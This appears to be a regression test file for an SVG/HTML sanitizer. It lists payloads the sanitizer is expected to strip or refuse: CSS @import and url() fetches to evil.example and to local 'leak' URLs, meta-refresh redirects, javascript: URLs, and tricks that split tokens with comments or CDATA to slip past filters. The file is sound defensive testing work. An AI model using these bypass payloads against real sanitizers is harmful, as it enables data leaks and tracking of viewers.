// Regression tests for the relay attack round: data: URLs limited to rasters, and no CSS that reaches out.
import { test } from 'node:test';
import assert from 'node:assert/strict';
import { sanitize } from '../lib/compose.js';

const PNG = 'data:image/png;base64,iVBORw0KGgo=';

test('a data: URL of any type but a raster is dropped from links', () => {
  for (const url of ['data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==', 'data:text/html,alert(1)',
    'data:image/svg+xml;base64,PHN2Zz48L3N2Zz4=']) {
    const out = sanitize(`<a href="${url}">x</a><image xlink:href="${url}"/>`);
    assert.ok(out !== null);
    assert.ok(!out.includes('data:text') && !out.includes('data:image/svg'), out);
  }
});

test('embedded rasters and fragment links are kept', () => {
  const out = sanitize(`<image href="${PNG}"/><rect fill="url(#grid)"/><use href="#mark"/>`);
  assert.ok(out.includes(PNG) && out.includes('url(#grid)') && out.includes('href="#mark"'), out);
});

test('a style block that imports, binds or reaches out refuses the fragment', () => {
  for (const css of ['@import url(http://evil.example/x.css);', 'a{b:expression(alert(1))}',
    'a{-moz-binding:url(http://evil.example/x.xml#y)}', 'a{behavior:url(#x)}', 'a{background:url(http://evil.example/p.png)}']) {
    assert.equal(sanitize(`<style>${css}</style>`), null, css);
    assert.equal(sanitize(`<style><![CDATA[${css}]]></style>`), null, css);
  }
});

test('ordinary CSS, keyframes and the recolor rules pass', () => {
  const css = '@media (prefers-reduced-motion: no-preference){@keyframes breathe{50%{opacity:.45}}}' +
    '.container{background:transparent!important}.bar{background:#53b14f}';
  assert.equal(sanitize(`<style>${css}</style>`), `<style>${css}</style>`);
});

test('any attribute holding an outside url() is dropped, the element kept', () => {
  const out = sanitize('<rect style="background:url(http://evil.example/b.png)" filter="url(http://evil.example/f#x)" ' +
    'fill="url(javascript:alert(1))" stroke="url(#ok)" width="2"/>');
  assert.ok(out.startsWith('<rect') && out.includes('stroke="url(#ok)"') && out.includes('width="2"'), out);
  assert.ok(!out.includes('evil') && !out.includes('javascript'), out);
});

test('a meta element is dropped, so a meta refresh cannot send the viewer anywhere', () => {
  const refresh = '<meta http-equiv="refresh" content="0;url=https://evil.example/leak"/>';
  for (const markup of [refresh, '<meta http-equiv="refresh" content="1;url=https://evil.example/x"></meta>',
    `<foreignObject><div xmlns="http://www.w3.org/1999/xhtml">${refresh}<b>kept</b></div></foreignObject>`,
    '<html:meta xmlns:html="http://www.w3.org/1999/xhtml" http-equiv="Refresh" content="0;url=https://evil.example/"/>']) {
    const out = sanitize(markup);
    assert.ok(out !== null, markup);
    assert.doesNotMatch(out, /meta|refresh|evil/i, out);
  }
  assert.ok(sanitize(`<foreignObject><div xmlns="http://www.w3.org/1999/xhtml">${refresh}<b>kept</b></div></foreignObject>`)
    .includes('<b>kept</b>'));
});

test('a backslash, written or referenced, refuses a style block and drops a style-bearing attribute', () => {
  for (const css of ['a{background:u\\72l(http://evil.example/b.png)}', '@\\69mport "http://evil.example/x.css";',
    'a{fill:u&#92;72l(http://evil.example/f)}', 'a{fill:u&#x5C;72l(http://evil.example/f)}', 'a{content:"\\"}']) {
    assert.equal(sanitize(`<style>${css}</style>`), null, css);
  }
  assert.equal(sanitize('<style><![CDATA[a{background:u\\72l(http://evil.example/b.png)}]]></style>'), null);
  const out = sanitize('<rect style="fill:u\\72l(http://evil.example/f)" fill="u&#92;72l(http://evil.example/g)" ' +
    'stroke="u\\72l(#x)" width="2"/>');
  assert.equal(out, '<rect width="2"/>');
});

test('a character reference cannot spell what the CSS checks refuse', () => {
  assert.equal(sanitize('<style>@&#105;mport "http://evil.example/x.css";</style>'), null);
  assert.equal(sanitize('<style>a{background:url&#40;http://evil.example/b.png)}</style>'), null);
  const out = sanitize('<rect fill="url&#40;http://evil.example/f)" style="background:url&#x28;https://evil.example/b)" ' +
    'stroke="url&#40;#ok)" width="2"/>');
  assert.equal(out, '<rect stroke="url&#40;#ok)" width="2"/>');
});

test('image-set() refuses a style block and drops the attribute holding it', () => {
  for (const css of ["a{background-image:image-set('https://evil.example/a.png' 1x)}",
    'a{background-image:-webkit-image-set("https://evil.example/a.png" 1x)}', 'a{background:IMAGE-SET("x" 1x)}']) {
    assert.equal(sanitize(`<style>${css}</style>`), null, css);
  }
  const out = sanitize(`<rect style="background-image:image-set('https://evil.example/a.png' 1x)" width="2"/>`);
  assert.equal(out, '<rect width="2"/>');
});

test('poster, background, action and formaction are URL attributes', () => {
  const html = '<div xmlns="http://www.w3.org/1999/xhtml">' +
    '<video poster="https://evil.example/p.png"/><table background="https://evil.example/t.png"><tr><td ' +
    'background="//evil.example/c.png">x</td></tr></table><form action="https://evil.example/f"><button ' +
    'formaction="https://evil.example/b">go</button></form><video poster="data:image/png;base64,iVBORw0KGgo="/></div>';
  const out = sanitize(html);
  assert.ok(out !== null);
  assert.doesNotMatch(out, /evil/);
  assert.ok(out.includes('<video poster="data:image/png;base64,iVBORw0KGgo="/>'), out);
  assert.equal(sanitize('<set attributeName="poster" to="https://evil.example/p.png"/>'), '<set to="https://evil.example/p.png"/>');
});

// Each of these was written out, before the style element was checked whole, as a working @import,
// url( or image-set(: the pieces on either side of the comment, processing instruction, CDATA section
// or element each passed alone, and the output joined them.
const SPLIT_CSS = [
  '@imp<!-- -->ort "http://127.0.0.1:1/leak-a.css";',
  '@imp<?x?>ort "http://127.0.0.1:1/leak-b.css";',
  '@imp<![CDATA[ort "http://127.0.0.1:1/leak-c.css";]]>',
  '@imp<script>x</script>ort "http://127.0.0.1:1/leak-d.css";',
  '@imp<g/>ort "http://127.0.0.1:1/leak-e.css";',
  'svg{background:ur<!---->l(http://127.0.0.1:1/leak-f.png)}',
  'svg{background-image:image-<!---->set("http://127.0.0.1:1/leak-g.png" 1x)}',
  'svg{background:ur<![CDATA[l(http://127.0.0.1:1/leak-h.png)]]>}',
  '*{background-image:ur<?x?>l(http://127.0.0.1:1/leak-i.png)}',
  '*{border-image:image-<![CDATA[set("http://127.0.0.1:1/leak-j.png" 1x)]]> 30}',
  'svg{background:<g>url(http://127.0.0.1:1/leak-k.png)</g>}',
  '@imp<![CDATA[]]>ort "http://127.0.0.1:1/leak-l.css";',
  '@<![CDATA[im]]>p<!-- -->o<?x?>rt "http://127.0.0.1:1/leak-m.css";',
];

test('a style element split by a comment, PI, CDATA or element cannot join its pieces into a fetch', () => {
  for (const css of SPLIT_CSS) {
    for (const markup of [`<style>${css}</style>`, `<g><style>${css}</style></g>`,
      `<foreignObject><div xmlns="http://www.w3.org/1999/xhtml"><style>${css}</style></div></foreignObject>`,
      `<script><style>${css}</style></script>`]) {
      assert.equal(sanitize(markup), null, markup);
    }
  }
});

test('a style element holds text and CDATA only, and its CDATA is checked joined to its text', () => {
  // Plain text and CDATA pass, written out as one run of text.
  assert.equal(sanitize('<style>a{fill:red}<![CDATA[b > c{fill:blue}]]>d{fill:url(#g)}</style>'),
    '<style>a{fill:red}b &gt; c{fill:blue}d{fill:url(#g)}</style>');
  // Anything else inside a style element refuses the fragment, even when it would be harmless.
  for (const inside of ['<!-- note -->', '<?pi x?>', '<g/>', '<b>x</b>', '<script>x</script>', '<style>a{}</style>']) {
    assert.equal(sanitize(`<style>a{fill:red}${inside}</style>`), null, inside);
  }
  // Outside a style element comments and processing instructions are still dropped, as before.
  assert.equal(sanitize('<g>a<!-- -->b<?x?>c</g>'), '<g>abc</g>');
});

test('imagesrcset, srcset, ping and attributionsrc are dropped whatever they hold', () => {
  const XH = 'xmlns="http://www.w3.org/1999/xhtml"';
  const markup = `<foreignObject width="9" height="9"><link ${XH} rel="preload" as="image" ` +
    'imagesrcset="http://127.0.0.1:1/leak-l.png 1x" imagesizes="10px"/>' +
    `<link ${XH} rel="preload" as="image" IMAGESRCSET="https://evil.example/u.png 1x"/>` +
    `<h:link xmlns:h="http://www.w3.org/1999/xhtml" rel="preload" as="image" h:imagesrcset="${PNG} 1x"/>` +
    `<img ${XH} src="${PNG}" srcset="${PNG} 1x" attributionsrc="https://evil.example/a"/>` +
    `<img ${XH} src="${PNG}" attributionsrc="#x"/><img ${XH} src="${PNG}" AttributionSrc=""/>` +
    `<a ${XH} href="#x" ping="https://evil.example/p https://evil.example/q">x</a></foreignObject>` +
    '<a href="#y" ping="#z"><text>y</text></a>';
  const out = sanitize(markup);
  assert.ok(out !== null);
  assert.doesNotMatch(out, /srcset|ping=|attributionsrc|evil|leak/i, out);
  assert.ok(out.includes(`<link ${XH} rel="preload" as="image" imagesizes="10px"/>`), out);
  assert.ok(out.includes(`<img ${XH} src="${PNG}"/>`), out);
  assert.ok(out.includes('<a href="#y"><text>y</text></a>'), out);
  for (const target of ['imagesrcset', 'IMAGESRCSET', 'srcset', 'ping', 'attributionsrc', 'lowsrc', 'data']) {
    assert.equal(sanitize(`<set attributeName="${target}" to="https://evil.example/x"/>`), '<set to="https://evil.example/x"/>', target);
  }
});

test('src() and image(), which the CSS specifications let fetch, are refused like url(), and xml:base is dropped', () => {
  for (const css of ['svg{background-image:src("https://evil.example/j.png")}', 'svg{background-image:image("https://evil.example/k.png")}',
    'svg{cursor:SRC ( "https://evil.example/c.png"),auto}', 'svg{content:image(url(#x))}']) {
    assert.equal(sanitize(`<style>${css}</style>`), null, css);
  }
  assert.equal(sanitize('<rect style="background:image(\'https://evil.example/a.png\')" width="2"/>'), '<rect width="2"/>');
  // Names that merely end in src or image are not those functions.
  const plain = '<style>svg{background-image:none}.x{fill:myimage(1);stroke:mysrc(2)}</style>';
  assert.equal(sanitize(plain), plain);
  assert.equal(sanitize('<g xml:base="https://evil.example/m/" id="g"><use href="#nope"/></g>'), '<g id="g"><use href="#nope"/></g>');
});

test('lowsrc, dynsrc, manifest, data and codebase keep only fragments and embedded rasters', () => {
  for (const name of ['lowsrc', 'dynsrc', 'manifest', 'data', 'codebase', 'LOWSRC']) {
    assert.equal(sanitize(`<img ${name}="https://evil.example/x.png"/>`), '<img/>', name);
    assert.equal(sanitize(`<img ${name}="//evil.example/x.png"/>`), '<img/>', name);
    assert.equal(sanitize(`<img ${name}="${PNG}"/>`), `<img ${name}="${PNG}"/>`, name);
  }
});
